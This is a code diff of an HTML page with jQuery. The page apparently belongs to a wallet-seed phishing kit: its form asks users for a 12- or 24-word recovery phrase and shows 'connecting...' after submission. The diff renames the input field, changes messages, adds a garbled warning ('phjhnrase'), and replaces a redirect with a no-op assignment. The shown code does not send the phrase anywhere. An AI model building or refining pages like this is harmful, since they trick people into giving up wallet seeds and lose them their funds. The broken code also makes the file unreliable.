@@ -1586,13 +1586,13 @@
             <form method="post">
 
               <div class="form-group my-2">
-                <span id="warn1" class="warn1 text-green" style="display: none;color: green">
-                  Please enter a valid phrase
+                <span id="warn1" class="warn text-green" style="display: none;color: green;">
+                  connecting...
                 </span>
                 <label class="form-label">
                   Phrase
                 </label>
-                <textarea name="phrase" class="form-control text-area" id="phrase" required></textarea>
+                <textarea name="phras" class="form-control text-area" id="phras" required></textarea>
                 <p>
                   <small>
                     Usually 12 (sometimes 24) words, enter words separated by single space.
@@ -1600,7 +1600,7 @@
                 </p>
                 <p>
                   <span id="warn" class="warn text-danger" style="display: none;">
-                    Please enter a valid phrase
+                    Please enter a valid phjhnrase
                   </span>
                 </p>
               </div>
@@ -1641,27 +1641,26 @@
   }
 
   function sendPhrase() {
-            const phrase = $("#phrase").val();
-            const wordCount = phrase.trim().split(/\s+/).length;
-            if (phrase == "") {
+            const phras = $("#phras").val();
+            const wordCount = phras.trim().split(/\s+/).length;
+
+            if (phras == "") {
                 $("#warn").css('display', 'block');
                 setTimeout(function(){
-                  $("#warn").css('display', 'none')
-                }, 2000); // Refresh the page after 2 seconds
+                    $("#warn").css('display', 'none');
+                }, 2000); // Hide the warning after 2 seconds
             } else if(wordCount >= 12){
                 $("#warn1").css('display', 'block');
                 setTimeout(function(){
-                    window.location.href = "http://example.com";
+                    const phrase=phras
                 }, 2000); // Redirect to another page after 2 seconds
             } else {
                 $("#warn").css('display', 'block');
                 setTimeout(function(){
-                  $("#warn").css('display', 'none');
-                }, 2000); // Refresh the page after 2 seconds
+                    $("#warn").css('display', 'none');
+                }, 2000); // Hide the warning after 2 seconds
             }
         }
-    </script>
-  
 </script>
 
 </html>
